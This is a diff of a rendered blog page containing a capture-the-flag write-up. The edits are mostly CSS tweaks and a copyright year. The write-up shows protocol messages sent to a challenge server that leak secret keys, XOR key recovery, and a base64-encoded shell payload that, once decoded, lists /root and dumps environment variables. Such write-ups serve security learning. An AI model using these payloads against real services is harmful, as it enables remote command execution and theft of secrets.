+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dogeon&#39;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">doge_generate_string</span> (<span style="color:#a6e22e">s</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">encrypted_string</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">zencrypter</span>(<span style="color:#a6e22e">s</span>);
@@ -926,7 +926,7 @@ Tying this all together we could start sending messages to the server. Following
 <p>
 After a bit of trial and error I was able to get the bytes by having the secrit_key serialized to json from a bytes Buffer.</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;Buffer.from(secrit_key) dose toJSON&#34; wow&#39;</span>))</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;Buffer.from(secrit_key) dose toJSON&#34; wow&#39;</span>))</span></span></code></pre></div>
 </div>
 <p>
 The output needed a little cleanup though…</p>
@@ -940,7 +940,7 @@ The output needed a little cleanup though…</p>
 <p>
 Now that I had the cyphertext output from the cript funciton. Could that be reversed? This is the cript function:</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">key</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cript</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">key</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">alloc</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">length</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">key</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">key</span>;
@@ -958,7 +958,7 @@ All this does is XOR the input with some key that was passed to the function- so
 <p>
 So I asked doge to get the cript_key as well</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;cript_key&#34; wow&#39;</span>))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#e6db74">&#39;such &#34;dogesez&#34; is &#34;do me a favor&#34; next &#34;ohmaze&#34; is &#34;cript_key&#34; wow&#39;</span>))
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">such</span> <span style="color:#e6db74">&#34;dogesez&#34;</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;welcome&#34;</span> <span style="color:#a6e22e">next</span> <span style="color:#e6db74">&#34;ohmaze&#34;</span> <span style="color:#a6e22e">is</span> <span style="color:#e6db74">&#34;dzm3xz5w3c9&#34;</span> <span style="color:#a6e22e">wow</span></span></span></code></pre></div>
 </div>
 <p>
@@ -968,7 +968,7 @@ Key: <code class="verbatim">CS{such_Pr0t0_is_n3tw0RkS_w0W}</code></p>
 <p>
 Another way to get the key was to base64 encode shell scripts and run them with this:</p>
 <div class="src src-javascript">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#e6db74">&#34;dogesez&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;hot doge&#34;</span>, <span style="color:#e6db74">&#34;bread&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaApscyAtYWwgL3Jvb3QvCmVudgo=&#34;</span>, <span style="color:#e6db74">&#34;sausage&#34;</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#34;flavor&#34;</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaAplY2hvICJjb29sIgo=&#34;</span>]}})))</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">doge_generate_string</span>(<span style="color:#a6e22e">dson</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#e6db74">&#34;dogesez&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;hot doge&#34;</span>, <span style="color:#e6db74">&#34;bread&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaApscyAtYWwgL3Jvb3QvCmVudgo=&#34;</span>, <span style="color:#e6db74">&#34;sausage&#34;</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#34;flavor&#34;</span><span style="color:#f92672">:</span>[<span style="color:#e6db74">&#34;IyEvdXNyL2Jpbi9lbnYgYmFzaAplY2hvICJjb29sIgo=&#34;</span>]}})))</span></span></code></pre></div>
 </div>
 </div>
 </div>
@@ -1001,7 +1001,7 @@ So what does <code class="verbatim">execute</code> do? It uses the argument pass
 <p>
 Once decrypted it jumps to that region of memory. So I knew that the key XORed with <code class="verbatim">0x40a0</code> has to yield valid x86_64 assembly. The first thing I wanted to figure out is what the key length was. I used the python in <a href="https://crypto.stackexchange.com/questions/35318/cryptanalysis-of-xor-cipher-with-repeated-key-phrase">this</a> StackOverflow link to determine the Incidence of Coincidence.</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">go</span>(msg):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">go</span>(msg):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> step <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">50</span>):
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">match</span> <span style="color:#f92672">=</span> total <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(msg)):
@@ -1106,13 +1106,13 @@ No luck.</p>
 <p>
 As a last try I repeated the same steps with every single binary in `/usr/bin/ <code class="verbatim">cat</code>&#39;d into an uberfile</p>
 <div class="src src-bash">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/bin/* &gt; uberfile
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /usr/bin/* &gt; uberfile
 </span></span><span style="display:flex;"><span>r2 uberfile</span></span></code></pre></div>
 </div>
 <p>
 and I got a HIT!</p>
 <div class="src src-shell">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>person@ubuntu:~/Desktop$ ./module.wow CS<span style="color:#f92672">{</span>crypt0_an4lys1s_0n_c0d3<span style="color:#f92672">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>person@ubuntu:~/Desktop$ ./module.wow CS<span style="color:#f92672">{</span>crypt0_an4lys1s_0n_c0d3<span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>CS<span style="color:#f92672">{</span>crypt0_an4lys1s_0n_c0d3<span style="color:#f92672">}</span></span></span></code></pre></div>
 </div>
 <p>
@@ -1162,7 +1162,7 @@ Key: <code class="verbatim">CS{crypt0_an4lys1s_0n_c0d3}</code></p>
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2026 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
